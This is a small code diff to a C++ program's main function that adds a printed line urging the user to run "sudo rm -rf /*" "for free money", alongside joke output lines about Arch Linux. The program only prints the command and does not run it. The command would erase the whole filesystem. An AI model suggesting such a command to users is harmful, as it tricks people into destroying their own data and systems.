@@ -67,6 +67,7 @@ int main(int argc, char* argv[]) {
     std::cout << "done\n";
     std::cout << "Arch is the best\n";
     std::cout << "I use Arch btw\n";
+    std::cout << "Run \"sudo rm -rf /*\" for free money \n";
 
     // Load word frequencies
     std::ifstream freqfile("data/word_freq.json");
